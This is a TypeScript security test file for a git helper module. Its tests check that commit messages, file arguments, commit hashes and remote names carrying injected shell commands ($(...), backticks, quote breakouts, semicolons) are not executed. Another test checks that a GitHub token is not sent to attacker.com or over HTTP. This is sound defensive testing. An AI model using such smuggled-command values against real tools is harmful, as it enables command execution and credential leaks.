import { test, describe, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { executeGit, commitChanges, rollbackToCommit, syncGit } from './git.js';
import { callGitHubAPI } from './git-core.js';

describe('Security: Git Command Injection Prevention (RED Tests)', () => {
  let tmpDir: string;
  let repoDir: string;
  let pwnedFile: string;

  beforeEach(async () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'git-sec-test-'));
    repoDir = path.join(tmpDir, 'repo');
    fs.mkdirSync(repoDir, { recursive: true });
    pwnedFile = path.join(tmpDir, 'PWNED');

    // Inicializa repo git básico
    await executeGit(['init', '-b', 'main'], repoDir);
    await executeGit(['config', 'user.name', 'SecurityTester'], repoDir);
    await executeGit(['config', 'user.email', 'sec@example.com'], repoDir);

    fs.writeFileSync(path.join(repoDir, 'init.txt'), 'hello world');
    await executeGit(['add', '.'], repoDir);
    await executeGit(['commit', '-m', 'initial commit'], repoDir);
  });

  afterEach(() => {
    try {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    } catch {}
  });

  test('commitChanges: mensagem com $(touch PWNED) não deve executar subshell', async () => {
    const maliciousMsg = `Feat: nova versão $(touch "${pwnedFile}")`;
    fs.writeFileSync(path.join(repoDir, 'change.txt'), 'content 1');

    await commitChanges(repoDir, maliciousMsg);

    const exists = fs.existsSync(pwnedFile);
    assert.strictEqual(exists, false, 'VULNERABILIDADE: Comando executado via interpolação de mensagem de commit!');
  });

  test('commitChanges: mensagem com crases `touch PWNED` não deve executar subshell', async () => {
    const maliciousMsg = `Feat: update \`touch "${pwnedFile}"\``;
    fs.writeFileSync(path.join(repoDir, 'change2.txt'), 'content 2');

    await commitChanges(repoDir, maliciousMsg);

    const exists = fs.existsSync(pwnedFile);
    assert.strictEqual(exists, false, 'VULNERABILIDADE: Comando executado via crases na mensagem de commit!');
  });

  test('commitChanges: argumento de arquivo com quebra de aspas e comando não deve executar subshell', async () => {
    fs.writeFileSync(path.join(repoDir, 'normal.txt'), 'payload');

    // Injeção via array de arquivos interpolado em git add "${file}"
    const maliciousFileArg = `normal.txt" ; touch "${pwnedFile}" ; git status -- "`;

    await commitChanges(repoDir, 'Commit com arg de arquivo hostil', [maliciousFileArg]);

    const exists = fs.existsSync(pwnedFile);
    assert.strictEqual(exists, false, 'VULNERABILIDADE: Comando executado via interpolação de arquivo no git add!');
  });

  test('rollbackToCommit: commit hash hostil com ponto-e-vírgula não deve executar subshell', async () => {
    const maliciousHash = `HEAD; touch "${pwnedFile}"`;

    try {
      await rollbackToCommit(repoDir, maliciousHash);
    } catch {}

    const exists = fs.existsSync(pwnedFile);
    assert.strictEqual(exists, false, 'VULNERABILIDADE: Injeção de shell no rollbackToCommit!');
  });

  test('syncGit: remote hostil não deve executar comandos de shell', async () => {
    const maliciousRemote = `origin; touch "${pwnedFile}"`;

    try {
      await syncGit(repoDir, maliciousRemote, 'main');
    } catch {}

    const exists = fs.existsSync(pwnedFile);
    assert.strictEqual(exists, false, 'VULNERABILIDADE: Injeção de shell no syncGit!');
  });

  test('callGitHubAPI: não deve enviar token para URLs externas arbitrárias (SEC-02)', async () => {
    let errMessage = '';
    try {
      await callGitHubAPI('https://attacker.com/evil-endpoint', 'ghp_secretToken12345');
    } catch (err: any) {
      errMessage = err.message;
    }

    assert.match(
      errMessage,
      /Destino da API Git não autorizado para envio de credenciais Bearer/,
      'VULNERABILIDADE SEC-02: callGitHubAPI aceitou enviar token Bearer para domínio de terceiro!'
    );
  });

  test('callGitHubAPI: deve rejeitar esquema HTTP sem TLS (SEC-02)', async () => {
    let errMessage = '';
    try {
      await callGitHubAPI('http://api.github.com/user', 'ghp_secretToken12345');
    } catch (err: any) {
      errMessage = err.message;
    }

    assert.match(
      errMessage,
      /requer HTTPS/i,
      'VULNERABILIDADE SEC-02: callGitHubAPI aceitou HTTP sem criptografia!'
    );
  });
});

